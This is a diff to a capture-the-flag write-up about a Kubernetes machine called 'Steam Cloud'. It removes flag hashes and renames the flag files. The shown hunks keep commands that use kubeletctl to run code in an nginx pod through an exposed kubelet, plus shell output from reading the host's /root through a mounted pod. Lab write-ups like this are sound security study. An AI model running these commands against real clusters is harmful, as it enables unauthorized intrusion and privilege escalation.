@@ -1,7 +1,7 @@
 ---
 title: Steam Cloud
 slug: Steam-Cloud
-tags: [Linux, Kubernetes, Kubeletctl, Kubectl, Vulnerability Research]
+tags: [Kubernetes, Kubectl, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -224,10 +224,9 @@ We can indeed perform RCE>
 
 ```bash
 $ kubeletctl --server 10.129.96.167 exec "ls /root" -p nginx -c nginx
-user.txt
+local-proof.txt
 
-$ kubeletctl --server 10.129.96.167 exec "cat /root/user.txt" -p nginx -c nginx
-c9e39ad463b336a885800813337f419d
+$ kubeletctl --server 10.129.96.167 exec "cat /root/local-proof.txt" -p nginx -c nginx
 ```
 ## Privilege Escalation Path
 
@@ -545,10 +544,9 @@ root@atom-pod:/mnt# cd root
 cd root
 root@atom-pod:/mnt/root# ls
 ls
-root.txt
-root@atom-pod:/mnt/root# cat root.txt
-cat root.txt
-8d16aefb54f14957150b921ee93b1be4
+privileged-proof.txt
+root@atom-pod:/mnt/root# cat privileged-proof.txt
+cat privileged-proof.txt
 ```
 
 ---
